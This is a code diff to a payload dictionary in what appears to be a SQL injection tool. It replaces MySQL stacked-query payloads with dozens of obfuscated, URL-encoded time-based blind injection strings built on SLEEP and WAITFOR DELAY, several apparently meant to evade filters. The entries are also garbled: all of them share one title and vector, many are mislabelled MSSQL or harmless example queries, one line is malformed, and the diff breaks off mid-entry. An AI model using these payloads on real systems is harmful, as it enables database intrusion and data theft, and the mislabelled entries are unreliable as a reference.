@@ -327,54 +327,723 @@ PAYLOADS = {
         "inline-query": [],
         "stacked-queries": [
             {
-                "payload": "(SELECT(1)FROM(SELECT(SLEEP([SLEEPTIME])))a)",
+                "payload": "DBMS-PIPE.RECEIVE-MESSAGE('IsjT',10)",
                 "comments": [
-                    {"pref": ";", "suf": "--"},
-                    {"pref": ",", "suf": "--"},
-                    {"pref": "';", "suf": "--"},
-                    {"pref": '";', "suf": "--"},
-                    {"pref": ");", "suf": "--"},
-                    {"pref": "');", "suf": "--"},
-                    {"pref": '");', "suf": "--"},
-                    {"pref": "',", "suf": "--"},
-                    {"pref": '",', "suf": "--"},
+                    {"pref": "", "suf": ""},
                 ],
-                "title": "MySQL >= 5.0.12 stacked queries (query SLEEP)",
-                "vector": "(SELECT(1)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
                 "dbms": "MySQL",
             },
             {
-                "payload": "if(now()=sysdate(),sleep([SLEEPTIME]),0)",
+                "payload": "CASE%20%20WHEN%20%20%20(%20(%20(%20(%201%20%20=%20%201%20)))%20)%20%20THEN%20%20(%20(%20SLEEP%20(%20(%20(%2010%20%20)%20)%20)%20)%20)%20END",
                 "comments": [
-                    {"pref": ";", "suf": "--"},
-                    {"pref": ",", "suf": "--"},
-                    {"pref": "';", "suf": "--"},
-                    {"pref": '";', "suf": "--"},
-                    {"pref": ");", "suf": "--"},
-                    {"pref": "');", "suf": "--"},
-                    {"pref": '");', "suf": "--"},
-                    {"pref": "',", "suf": "--"},
-                    {"pref": '",', "suf": "--"},
+                    {"pref": "", "suf": ""},
                 ],
-                "title": "MySQL >= 5.0.12 stacked queries (query SLEEP - comment)",
-                "vector": "if([INFERENCE],sleep([SLEEPTIME]),0)",
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
                 "dbms": "MySQL",
             },
             {
-                "payload": "(SELECT CASE WHEN(1234=1234) THEN SLEEP([SLEEPTIME]) ELSE 0 END)",
+                "payload": "if%20%20(%2029%20!=%20%2093%20,%20sleep%20%20(%20(%20(%20%20(%2010%20%20)%20)%20%20)%20)%20,%200%20%20)",
                 "comments": [
-                    {"pref": ";", "suf": "--"},
-                    {"pref": ",", "suf": "--"},
-                    {"pref": "';", "suf": "--"},
-                    {"pref": '";', "suf": "--"},
-                    {"pref": ");", "suf": "--"},
-                    {"pref": "');", "suf": "--"},
-                    {"pref": '");', "suf": "--"},
-                    {"pref": "',", "suf": "--"},
-                    {"pref": '",', "suf": "--"},
+                    {"pref": "", "suf": ""},
                 ],
-                "title": "MySQL >= 5.0.12 stacked queries (query SLEEP - CASE STATEMENT)",
-                "vector": "(SELECT CASE WHEN([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE 0 END)",
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "WAITFOR%20DELAY%20%00'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "WAITFOR%20DELAY%20%00'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "WAITFOR%20DELAY%20%08'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "WAITFOR%20DELAY%20%08'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "WAITFOR%20DELAY%20%11'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "WAITFOR%20DELAY%20%11'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "WAITFOR%20DELAY%20%1D'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "WAITFOR%20DELAY%20%1D'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "WAITFOR%20DELAY%20N'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "WAITFOR%20DELAY%20N'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "SECOND(ELT(1453=1453,SLEEP(SECOND(10))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "SELECT%20CEILING(9.75)",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "SELECT%20DATENAME(day,%20'2017/08/10')",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "SELECT%20LEN('W3Schools.com')",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "SELECT%20PATINDEX('%schools%',%20'W3Schools.com')",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "SELECT%20SQUARE(2)",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "SELECT%20UNICODE('Atlanta')",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "select+DATEPART(day,+'2017/08/05')",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "select+degrees(ATN2(2,+22))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "sleep(LAST_DAY(\"0-01-01\"))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "sleep(MAKETIME(0,%2000,%204))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "sleep(MOD(21,%2011))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "sleep(MOD(21,%2011))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "sleep(REPEAT(10,%201))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "sleep(REPEAT(10,%201))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "sleep(REPLACE(\"19\",%20\"9\",%20\"0\"))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "sleep(REPLACE(\"19\",%20\"9\",%20\"0\"))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "sleep(SECOND(10))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "sleep(SECOND(10))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "sleep(time(10))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "sleep(time(10))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "XOR(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))XOR",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "XOR(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))XOR",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(BINARY(SELECT(sleep(MOD(21,%2011)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(BINARY(SELECT(sleep(REPEAT(10,%201)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(BINARY(SELECT(sleep(REPLACE(\"19\",%20\"9\",%20\"0\")))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(BINARY(SELECT(sleep(TIME(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(BINARY(SELECT(sleep(TIME(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(LAST_DAY(IF(1=1,SLEEP(REPEAT(10,%201)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(LAST_DAY(IF(1=1,SLEEP(REPEAT(10,%201)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(LAST_DAY(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(LAST_DAY(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(LAST_DAY(IF(1=1,SLEEP(SECOND(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(LAST_DAY(IF(1=1,SLEEP(SECOND(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(last_day(if(now()=sysdate(),sleep(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(last_day(if(now()=sysdate(),sleep(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(last_day(if(now()=sysdate(),sleep(SECOND(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(last_day(if(now()=sysdate(),sleep(SECOND(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(last_day(if(now()=sysdate(),sleep(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(last_day(if(now()=sysdate(),sleep(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(SECOND(ELT(1453=1453,SLEEP(time(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(SECOND(ELT(1453=1453,SLEEP(time(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-(SECOND(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-SLEEP(time(10))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "(BINARY(SELECT(sleep(MOD(21,%2011)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "(BINARY(SELECT(sleep(REPEAT(10,%201)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "(BINARY(SELECT(sleep(REPLACE(\"19\",%20\"9\",%20\"0\")))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "(BINARY(SELECT(sleep(TIME(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "(BINARY(SELECT(sleep(TIME(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "(SECOND(-IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
